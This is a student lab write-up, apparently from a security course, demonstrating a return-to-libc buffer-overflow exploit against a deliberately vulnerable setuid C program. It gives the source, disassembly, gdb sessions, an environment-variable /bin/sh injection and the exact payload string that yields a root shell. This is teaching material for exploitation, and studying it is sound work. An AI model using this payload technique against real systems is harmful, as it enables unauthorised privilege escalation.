


#Advanced Exploits Taunt Lab
 - Return-to-libc 
 - Format String attack
 -  Heap Overflow
 -  ROP

This lab includes some advanced exploits skills. The non-executable bit for writable segments (NX) has now been enabled for some of your targets. You will no longer be able to jump to shellcode on the stack. 
##Return-to-libc
The code below is a vulnerable program 	__durka.c__ with some system call we can use. _
``` C

/* Belongs to user*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#define _GNU_SOURCE
#include <unistd.h>

void f(char *s)
{
        char buf[260];
        strcpy(buf, s);
}

void agonistic_heaven(void)
{
        static uid_t uid;
        uid = geteuid();
        setresuid (uid, uid, uid);
}

void flugeldufel(void)
{
        system("/usr/bin/fortune"); /* Oh no! */
        exit(0);
}

int main(int argc, char *argv[])
{
        if (argc < 2)
                exit(1);

        uid_t uid = getuid();
        uid_t euid = geteuid();

printf("running as uid = %u, euid = %u\n", uid, euid);

        f(argv[1]);

        return 0;
}

```
The program generously sets up the euid and id for us, and does a system call `system("/usr/bin/fortune")` which we can use. Moreover, notice this time, the environment variable is not flushed out (Hooray!) meaning we can inject some useful string to the environment variable table. So let's get started. 
To begin, notice that only `f()` is explicitly called in `main()`, and `buf[260]` is reserved. Recall the next 4 bytes after `buf` will be `$ebp` and the next 4 byte will be the return address, which we want to manipulate. And after the return address is popped from stack, the next 4 byte will be the new return address. So we can first try to chain up the return address to get us inside the `agonistic_heaven()`function. 
The technique is as introduced before. 
`user@host:/your-dir$ objdump -d durka`
``` 
08048590 <agonistic_heaven>:
 8048590:       55                      push   %ebp
 8048591:       89 e5                   mov    %esp,%ebp
 8048593:       e8 48 fe ff ff          call   80483e0 <geteuid@plt>
 8048598:       50                      push   %eax
 8048599:       50                      push   %eax
 804859a:       50                      push   %eax
...
080485b0 <flugeldufel>:
 80485b0:       55                      push   %ebp
 80485b1:       89 e5                   mov    %esp,%ebp
 80485b3:       68 50 86 04 08          push   $0x8048650
 80485b8:       e8 43 fe ff ff          call   8048400 <system@plt>
 80485bd:       6a 00                   push   $0x0
 80485bf:       e8 4c fe ff ff          call   8048410 <exit@plt>
 80485c4:       66 90                   xchg   %ax,%ax

```
Let's write down the several interesting addresses first.
`agonistic_heaven : 0x08048590 `
`flugeldufel      : 0x080485b0`
`call   8048400 <system@plt>: 0x80485b8`
 
You may wonder why we don't want to use the address of the system call `system@plt` itself. The reason is that `bash` will ignore any `null ` bytes as argument, so the `00` byte in address `0x08048400` will be ignored, and that is a real pain in the ass.
	 
So chain up the return addresses like this:
`$(python -c 'print "A"*264+"\x90\x85\x04\x08\xb8\x85\x04\x08"')`
And let's try run this input inside `gdb` and examine the stack at each function. 
Open up your `gdb` debugger with __durka__.
`user@host:/your-dir$ gdb durka`
Don't forget to clear out the `LINES` and `COLUMNS` environment variables, or otherwise your exploit may not work outside the `gdb`.
```
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
```

Set up several break points so we can examine the stack.
``` gdb
 (gdb) b f
Breakpoint 1 at 0x8048570: file durka.c, line 11.
(gdb) b agonistic_heaven
Breakpoint 2 at 0x8048590: file durka.c, line 17.
(gdb) b flugeldufel
Breakpoint 3 at 0x80485b0: file durka.c, line 24.
```
run the program with the designed input:
``` gdb
run $(python -c 'print "A"*264+"\x90\x85\x04\x08\xb8\x85\x04\x08"')
Starting program: /c0re/durka $(python -c 'print "A"*264+"\x90\x85\x04\x08\xb8\x85\x04\x08"')
running as uid = 1030, euid = 1030

Breakpoint 1, f (s=0xffffdb5d 'A' <repeats 200 times>...) at durka.c:11
(gdb) cont
Continuing.

Breakpoint 2, agonistic_heaven () at durka.c:17
```
Emm, indeed we step in to `agnostic_heaven()` not bad. Let's examine what the stack look like after the function finished.
```
(gdb) disas
Dump of assembler code for function agonistic_heaven:
=> 0x08048590 <+0>:     push   %ebp
   0x08048591 <+1>:     mov    %esp,%ebp
   0x08048593 <+3>:     call   0x80483e0 <geteuid@plt>
   0x08048598 <+8>:     push   %eax
   0x08048599 <+9>:     push   %eax
   0x0804859a <+10>:    push   %eax
   0x0804859b <+11>:    call   0x80483b0 <setresuid@plt>
   0x080485a0 <+16>:    add    $0xc,%esp
   0x080485a3 <+19>:    leave
   0x080485a4 <+20>:    ret
End of assembler dump.
(gdb) until *0x080485a3
0x080485a3 in agonistic_heaven () at durka.c:21
(gdb) x/32x $ebp
0xffffd960:     0x41414141      0x080485b8      0x08048600      0x00000406
0xffffd970:     0x00000406      0x00000000      0x00000000      0xf7e2a276
0xffffd980:     0x00000002      0xffffda14      0xffffda20      0x00000000
0xffffd990:     0x00000000      0x00000000      0xf7fc5000      0xf7ffdc0c
0xffffd9a0:     0xf7ffd000      0x00000000      0x00000002      0xf7fc5000
0xffffd9b0:     0x00000000      0x05846f03      0x3f730313      0x00000000
0xffffd9c0:     0x00000000      0x00000000      0x00000002      0x0804847b
0xffffd9d0:     0x00000000      0xf7fee720      0xf7e2a189      0xf7ffd000

```
`0x080485b8` is the address where we will call `system@plt`, but with what parameter? Recall that the parameter is always pushed to the top of stack, which right now is the next four bytes after the call address `0x08048600`, it should be some random stuff, but let's just check.
```
(gdb) x/s 0x08048600
0x8048600 <__libc_csu_init+48>: "1\377\215\266"
```
Indeed.
What we really want to pass to the `system()` is no doubt `/bin/sh`, but where can we find it? Once we have the address of `/bin/sh` we can simply append it to our current exploit input to make it the parameter of `system()`. So let's find a place for `/bin/sh`. 
There are different ways to do so (I believe). I will focus on how to inject through environment variable. This is a useful technique not only here, but you can also inject your shellcode into the system variable, given the program disabled `ASRL` and didn't flush the environ table. 
Let's first examine the existed environment variables. 
```
user@host:/your-dir$ env
_system_type=Linux
SSH_CONNECTION=170.140.151.178 60648 172.18.1.11 22
LANG=en_US.UTF-8
rvm_bin_path=/usr/local/rvm/bin
OLDPWD=/
rvm_version=1.29.3 (latest)
RUBY_VERSION=ruby-2.4.1
GEM_HOME=/usr/local/rvm/gems/ruby-2.4.1
USER=user
PWD=/c0re
_system_version=9
HOME=/home/user
_system_name=Debian
SSH_CLIENT=170.140.151.178 60648 22
_system_arch=x86_64
GEM_PATH=/usr/local/rvm/gems/ruby-2.4.1:/usr/local/rvm/gems/ruby-2.4.1@global
SSH_TTY=/dev/pts/0
rvm_path=/usr/local/rvm
MAIL=/var/mail/user
TERM=xterm
SHELL=/bin/bash
rvm_prefix=/usr/local
SHLVL=1
LOGNAME=user
MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-2.4.1
PATH=/usr/local/rvm/gems/ruby-2.4.1/bin:/usr/local/rvm/gems/ruby-2.4.1@global/bin:/usr/local/rvm/rubies/ruby-2.4.1/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin:/home/user/bin
IRBRC=/usr/local/rvm/rubies/ruby-2.4.1/.irbrc
_=/usr/bin/env
```
Hmmm, `/bin/bash` looks interesting, but not exactly what we want cause it won't give you the root privilege, we need to put out own `/bin/sh` there.
The way to do it in `LINUX` command line is :
```
user@host:/your-dir$ export EVIL=/bin/sh
user@host:/your-dir$ env
_system_type=Linux
SSH_CONNECTION=170.140.151.178 60648 172.18.1.11 22
LANG=en_US.UTF-8
rvm_bin_path=/usr/local/rvm/bin
OLDPWD=/
rvm_version=1.29.3 (latest)
RUBY_VERSION=ruby-2.4.1
GEM_HOME=/usr/local/rvm/gems/ruby-2.4.1
USER=user
PWD=/c0re
_system_version=9
HOME=/home/user
_system_name=Debian
SSH_CLIENT=170.140.151.178 60648 22
EVIL=/bin/sh
_system_arch=x86_64
GEM_PATH=/usr/local/rvm/gems/ruby-2.4.1:/usr/local/rvm/gems/ruby-2.4.1@global
SSH_TTY=/dev/pts/0
rvm_path=/usr/local/rvm
MAIL=/var/mail/user
TERM=xterm
SHELL=/bin/bash
rvm_prefix=/usr/local
SHLVL=1
LOGNAME=user
MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-2.4.1
PATH=/usr/local/rvm/gems/ruby-2.4.1/bin:/usr/local/rvm/gems/ruby-2.4.1@global/bin:/usr/local/rvm/rubies/ruby-2.4.1/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin:/home/user/bin
IRBRC=/usr/local/rvm/rubies/ruby-2.4.1/.irbrc
_=/usr/bin/env
```
We now have an `EVIL` environment variable as `/bin/sh`. Yayyy!
The next step will be trying to figure out where is this variable is stored. Of course this can be achieved in `gdb`. Remember that the environment variables are only loaded to the stack when the program is running. 
```
(gdb) info variable environ
All variables matching regular expression "environ":

Non-debugging symbols:
0xf7fc6dbc  __environ
0xf7fc6dbc  _environ
0xf7fc6dbc  environ
(gdb) x/s **0xf7fc6dbc
0xffffdc5c:     "_system_type=Linux"
(gdb) x/s **0xf7fc6dbc+1
0xffffdc5d:     "system_type=Linux"
(gdb)
0xffffdc6f:     "SSH_CONNECTION=170.140.151.178 60648 172.18.1.11 22"
(gdb)
0xffffdca3:     "_=/usr/bin/gdb"
```
This is how you figure out the address of the whole environment table. Step through it ad figure out where is the `EVIL` variable stored.
```
(gdb)
0xffffddbc:     "EVIL=/bin/sh"
(gdb) x/s 0xffffddc1
0xffffddc1:     "/bin/sh"
```
Perfect! Now we have an address for `/bin/sh`. Next let's add this to the exploit string. And try it out inside `gdb` first
```
(gdb) run $(python -c 'print "A"*264+"\x90\x85\x04\x08\xb8\x85\x04\x08\xc6\xdd\xff\xff"')
Starting program: /c0re/attacklib1 $(python -c 'print "A"*264+"\x90\x85\x04\x08\xb8\x85\x04\x08\xc6\xdd\xff\xff"')
running as uid = 1030, euid = 1030
$
```
Yes! We spawn a shell!
Now let's try it with the program itself. Note, there is another program with `euid=0` called `attacklib1` so you don't have t worry about the discrepancy between your `uid` and `euid`
```
rwang74@4550866279a6:/c0re$ /c0re/attacklib1 $(python -c 'print "A"*264+"\x90\x85\x04\x08\xb8\x85\x04\x08\xc1\xdd\xff\xff"')
running as uid = 1030, euid = 0 
# whoami
# root
```
Yayyyyy! We exploited a program without inject shellcode!


